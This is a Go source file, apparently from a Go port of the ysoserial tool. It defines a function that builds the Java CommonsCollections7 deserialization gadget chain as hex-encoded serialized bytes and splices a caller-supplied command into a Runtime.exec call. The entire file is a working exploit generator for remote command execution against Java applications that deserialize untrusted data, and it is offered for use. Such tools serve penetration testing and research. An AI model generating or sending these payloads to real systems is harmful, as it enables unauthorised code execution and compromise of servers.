package gadget

import (
	"bytes"
	"encoding/hex"
	"strings"

	"github.com/JimmyWA/gososerial/ysoserial/util"
)

const CC7 = "CommonsCollections7"

func GetCommonsCollections7(cmd string) []byte {
	prefix := "ACED0005737200136A6176612E7574696C2E486173687461626C6513BB0" +
		"F25214AE4B803000246000A6C6F6164466163746F724900097468726573686F6C" +
		"6478703F4000000000000877080000000B000000027372002A6F72672E6170616" +
		"368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D" +
		"61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F617" +
		"0616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F" +
		"726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6" +
		"C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F" +
		"726D657230C797EC287A97040200015B000D695472616E73666F726D657273740" +
		"02D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E" +
		"732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652" +
		"E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723B" +
		"BD562AF1D83418990200007870000000057372003B6F72672E6170616368652E6" +
		"36F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E73" +
		"74616E745472616E73666F726D6572587690114102B1940200014C000969436F6" +
		"E7374616E747400124C6A6176612F6C616E672F4F626A6563743B787076720011" +
		"6A6176612E6C616E672E52756E74696D650000000000000000000000787073720" +
		"03A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E" +
		"66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7" +
		"CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A65" +
		"63743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537" +
		"472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E" +
		"672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743" +
		"B90CE589F1073296C02000078700000000274000A67657452756E74696D657572" +
		"00125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787" +
		"0000000007400096765744D6574686F647571007E001700000002767200106A61" +
		"76612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001" +
		"77371007E000F7571007E001400000002707571007E001400000000740006696E" +
		"766F6B657571007E001700000002767200106A6176612E6C616E672E4F626A656" +
		"374000000000000000000000078707671007E00147371007E000F757200135B4C" +
		"6A6176612E6C616E672E537472696E673BADD256E7E91D7B47020000787000000" +
		"001"
	finalCmd := bytes.Buffer{}
	finalCmd.WriteString("74")
	data := strings.ToUpper(hex.EncodeToString([]byte(cmd)))
	if len(data)/2 > 0xFFFF {
		return []byte{}
	}
	dataLen := util.Int16ToBytes(uint16(len(data) / 2))
	finalCmd.WriteString(dataLen)
	finalCmd.WriteString(data)
	suffix := "740004657865637571007E00170000000171007E001C7371007E000A737" +
		"200116A6176612E6C616E672E496E746567657212E2A0A4F78187380200014900" +
		"0576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E" +
		"08B020000787000000001737200116A6176612E7574696C2E486173684D617005" +
		"07DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686" +
		"F6C6478703F4000000000000C77080000001000000001740002797971007E002F" +
		"787871007E002F7371007E000271007E00077371007E00303F4000000000000C7" +
		"70800000010000000017400027A5A71007E002F78787371007E002D0000000278"
	ser, err := hex.DecodeString(prefix + finalCmd.String() + suffix)
	if err != nil {
		return []byte{}
	}
	return ser
}
